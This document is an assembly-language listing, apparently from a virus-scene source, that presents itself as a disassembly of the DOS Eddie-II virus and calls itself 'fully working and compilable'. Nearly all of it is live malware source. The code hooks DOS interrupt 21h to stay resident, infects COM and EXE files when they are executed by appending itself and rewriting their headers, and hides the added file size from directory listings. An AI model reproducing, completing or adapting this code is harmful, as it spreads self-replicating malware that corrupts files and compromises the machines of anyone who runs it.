   ; comment~
   ; As appendic to article about The Dark Avenger, I append this one
   ; dizzambly of the Eddie-II virus. Fully working and compilable !
   ; I used IDA - very kewl tool :-PPPP.
   ~
                   model tiny
                   codeseg
                   org 100h

   start:
           call    get_delta

   get_delta:
           pop bx
           sub bx, 3       ; delta offset
           push    ax
           sub ax, ax
           mov es, ax
           mov ax, es:84h
           mov cs:[bx+old_21_off-start], ax
           mov ax, es:86h  ; guess what does this code :)
           mov cs:[bx+old_21_seg-start], ax
           mov ax, 0A55Ah
           int 21h     ; are you here ?
           cmp ax, 5AA5h
           jz  in_memory
           mov ax, sp
           inc ax
           mov cl, 4       ; convert SP to paras
           shr ax, cl
           inc ax      ; AX hols SP in paras
           mov cx, ss
           add ax, cx
           mov cx, ds      ; PSP
           dec cx
           mov es, cx      ; ES points to MCB
           mov di, 2
           mov dx, 43
           mov cx, [di]    ; get PSP size
           sub cx, dx
           cmp cx, ax
           jb  in_memory
           sub es:[di+1], dx   ; is large enough, cut in MCB
           mov [di], cx
           mov es, cx
           mov si, bx      ; si = start of  body
           sub di, di
           mov cx, 320
           cld
   ;                db 02Eh, 0f3h
   ;               movsw                   ;
                   rep movs word ptr es:[di], word ptr cs:[si]
           mov ax, es      ; ax -virus segment
           mov es, cx      ; es = 0
           cli         ; hook INT 21
                   mov     word ptr es:84h, offset new_21_handler- offset start
           mov es:86h, ax
           sti

   in_memory:
           push    ds
           pop es
           mov ax, cs:[MZ_BUFFER-start][bx]
           cmp ax, 'ZM'
           jz  exe_exit
           cmp ax, 'MZ'
           jz  exe_exit
           mov di, 100h
           mov [di], ax
           mov al, byte ptr [LAST_PAGE-start][bx]
           mov [di+2], al  ; restore 3 bytes in com
           pop ax
           push    di
           retn
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   exe_exit:
           pop ax
           mov dx, ds
           add dx, 10h
           add cs:[SAVED_RELO_CS-start][bx], dx
           add dx, cs:[SAVED_RELO_SS-start][bx]
           mov ss, dx
           mov sp, cs:[SAVED_RELO_SP-start][bx]
           jmp dword ptr cs:[SAVED_RELO_IP-start][bx]
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   new_21_handler:
           sti
           cmp ax, 4B00h
           jz  infect
           cmp ah, 11h
           jz  stealth_dir
           cmp ah, 12h
           jz  stealth_dir
           cmp ax, 0A55Ah
           jz  memory_call
           jmp back_2_old_21
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   stealth_dir:
           pushf
                   call    dword ptr cs:[old_21_off-start]
           test    al, al      ; error ?
           jnz error
           push    ax
           push    bx
           push    es
           mov bx, dx
           mov al, [bx]    ; get 1st bytes of FCB
           push    ax
           mov ah, 2Fh ; '/'
           int 21h     ; DOS - GET DISK TRANSFER AREA ADDRESS
                       ; Return: ES:BX -> DTA
           pop ax
           inc al
           jnz not_extended
           add bx, 7

   not_extended:
           mov ax, es:[bx+17h]
           and al, 1Fh
           cmp al, 1Fh     ; infected
           jnz skip_stealth
           and byte ptr es:[bx+17h], 0E0h ; 'à'
           sub word ptr es:[bx+1Dh], 28Bh
           sbb word ptr es:[bx+1Fh], 0; cut size

   skip_stealth:
           pop es
           pop bx
           pop ax

   error:
           iret
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   memory_call:
           not ax
           iret
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   infect:
           push    ds
           push    es
           push    ax
           push    bx
           push    cx
           push    dx
           push    si
           push    di
           mov ax, 3524h
           int 21h     ; DOS - 2+ - GET INTERRUPT VECTOR
                       ; AL = interrupt number
                       ; Return: ES:BX = value of interrupt vector
           push    es
           push    bx
           push    ds
           push    dx
           push    cs
           pop ds
                   mov     dx, offset virus_24-offset start
           mov ax, 2524h
           int 21h     ; DOS - SET INTERRUPT VECTOR
                       ; AL = interrupt number
                       ; DS:DX = new vector to be used for specified interrupt
           pop dx
           pop ds
           mov ax, 4300h
           int 21h     ; DOS - 2+ - GET FILE ATTRIBUTES
                       ; DS:DX -> ASCIZ file name or directory name without trailing slash
           jnb got_attribs
           sub cx, cx
           jmp put_back_attrib
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   got_attribs:
           push    cx
           test    cl, 1
           jz  attribz_okay    ; read only ?
           dec cx      ; fix it
           mov ax, 4301h
           int 21h     ; DOS - 2+ - GET FILE ATTRIBUTES
                       ; CX = file attribute bits
                       ; DS:DX -> ASCIZ file name

   attribz_okay:
           mov ax, 3D02h
           int 21h     ; DOS - 2+ - OPEN DISK FILE WITH HANDLE
                       ; DS:DX -> ASCIZ filename
                       ; AL = access mode
                       ; 2 - read & write
           push    cs
           pop ds
           jnb open_okay
           jmp pop_attribz
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   open_okay:              ; save handle
           mov bx, ax
           mov ax, 5700h
           int 21h     ; DOS - 2+ - GET FILE'S DATE/TIME
                       ; BX = file handle
           jb  jmp_2_close ; cx - time, dx - date
           mov al, cl
           or  cl, 31      ; infection marker is second = 62
           cmp al, cl
           jnz not_infected

   jmp_2_close:
           jmp close_file
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   not_infected:
           push    cx
           push    dx
                   mov     dx, (offset MZ_BUFFER-offset start)
           mov cx, 18h
           mov ah, 3Fh ; '?'
           int 21h     ; DOS - 2+ - READ FROM FILE WITH HANDLE
                       ; BX = file handle, CX = number of bytes to read
                       ; DS:DX -> buffer
           jb  jmp2_mark_error
           sub cx, ax      ; did we read all bytes ?
           jnz jmp2_mark_error
                   les     ax, dword ptr ds:[RELO_SS-start]
                   mov     ds:[SAVED_RELO_SP-start], es
                   mov     ds:[SAVED_RELO_SS-start], ax
                   les     ax, ds:[RELO_CS_IP-start]
                   mov     ds:[SAVED_RELO_IP-start], ax
                   mov     ds:[SAVED_RELO_CS-start], es
           mov dx, cx
           mov ax, 4202h
           int 21h     ; DOS - 2+ - MOVE FILE READ/WRITE POINTER (LSEEK)
                       ; AL = method: offset from end of file
           jb  jmp2_mark_error
                   mov     word ptr ds:[size_low-start], ax
                   mov     ds:[size_high-start], dx
           mov cx, 651     ; virus size
           cmp ax, cx
           sbb dx, 0       ; exclude to small filez
           jb  jmp2_mark_error
           call    test_if_exe ; returns Z=1 if true
           jz  is_exe
           cmp ax, 64373   ; upper limit
           jb  is_exe

   jmp2_mark_error:
           jmp error_marker
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   is_exe:                 ; ds:dx is now points to virus
           sub dx, dx
           mov ah, 40h ; '@'
           int 21h     ; write body
           jb  jmp2_mark_error
           sub cx, ax      ; all bytes ?
           jnz jmp2_mark_error
           mov dx, cx
           mov ax, 4200h
           int 21h     ; lseek bof
           jb  jmp2_mark_error
                   mov     ax, word ptr ds:[size_low-start]
           call    test_if_exe ; returns Z=1 if true
           jnz handle_com
                   mov     dx, word ptr ds:[size_high-start]
           mov cx, 4
                   mov     si, word ptr ds:[HEADER_SIZE-start]
           sub di, di

   convert_2_bytes:
           shl si, 1
           rcl di, 1
           loop    convert_2_bytes ; si bytes in header
           sub ax, si      ; new ip
           sbb dx, di      ; new cs for relocation
           mov cl, 12
           shl dx, cl
                   mov     word ptr ds:[RELO_CS_IP-start], ax
                   mov     word ptr ds:[RELO_CS_IP+2-start], dx
           add dx, 31h ; '1'
           nop
                   mov    ds:[ RELO_SP-start], ax
                   mov    ds:[RELO_SS-start], dx
                   add    word ptr ds:[MIN_MEM-start], 9
                   mov     ax, word ptr ds:[MIN_MEM-start]
                   cmp     ax, word ptr ds:[MAX_MEM-start]
           jb  skip_maxmem_fix
                   mov     ds:[MAX_MEM-start], ax

   skip_maxmem_fix:
                   mov     ax, word ptr ds:[LAST_PAGE-start]
           add ax, 651
           push    ax
           and ah, 1
                   mov     ds:[LAST_PAGE-start], ax
           pop ax
           mov cl, 9
           shr ax, cl
                   add     ds:[PAGES_COUNT-start], ax
           jmp short write_header
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   handle_com:
           sub ax, 3
                   mov     byte ptr ds:[MZ_BUFFER-start], 0E9h ; 'é'
                   mov     word ptr ds:[MZ_BUFFER+1-start], ax; write virus jump

   write_header:
                   mov     dx, offset MZ_BUFFER-offset start
           mov cx, 18h
           mov ah, 40h ; '@'
           int 21h     ; put header there
           jb  error_marker
           cmp ax, cx      ; all byte ?
           jz  restore_time

   error_marker:
           stc

   restore_time:
           pop dx
           pop cx
           jb  close_file
           mov ax, 5701h
           int 21h     ; DOS - 2+ - SET FILE'S DATE/TIME
                       ; BX = file handle, CX = time to be set (see AX=5700h)
                       ; DX = date to be set (see AX=5700h)

   close_file:
           mov ah, 3Eh ; '>'
           int 21h     ; DOS - 2+ - CLOSE A FILE WITH HANDLE
                       ; BX = file handle

   pop_attribz:
           pop cx

   put_back_attrib:
           test    cl, 1
           jz  skip_attrib
           mov ax, 4301h
           int 21h     ; DOS - 2+ - GET FILE ATTRIBUTES
                       ; CX = file attribute bits
                       ; DS:DX -> ASCIZ file name

   skip_attrib:
           pop dx
           pop ds
           mov ax, 2524h
           int 21h     ; DOS - SET INTERRUPT VECTOR
                       ; AL = interrupt number
                       ; DS:DX = new vector to be used for specified interrupt
           pop di
           pop si
           pop dx
           pop cx
           pop bx
           pop ax
           pop es
           pop ds

   back_2_old_21:
                   jmp     dword ptr cs:[old_21_off-start]
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   virus_24:
           mov al, 3
           iret
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   ;         S u b r o u t i n e

   test_if_exe proc near       ; returns Z=1 if true
                   mov     si, ds:[MZ_BUFFER-start]
           cmp si, 'ZM'
           jz  locret_0_26F
           cmp si, 'MZ'

   locret_0_26F:
           retn
                   endp
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   m_EddieLives    db 'Eddie lives',0
   old_21_off      dw ?
   old_21_seg      dw ?
   SAVED_RELO_IP   dw ?
   SAVED_RELO_CS   dw ?
   SAVED_RELO_SP   dw ?
   SAVED_RELO_SS   dw ?
   MZ_BUFFER       dw 20cdh                ; to exit corectly
   LAST_PAGE       dw ?
   PAGES_COUNT     dw ?
   RELO_COUNT      dw ?
   HEADER_SIZE     dw ?
   MIN_MEM         dw ?
   MAX_MEM         dw ?
   RELO_SS         dw ?
   RELO_SP         dw ?
   CHKSUM          dw ?
   RELO_CS_IP      dd ?
   size_low        dw ?
   size_high       dw ?

                   end start
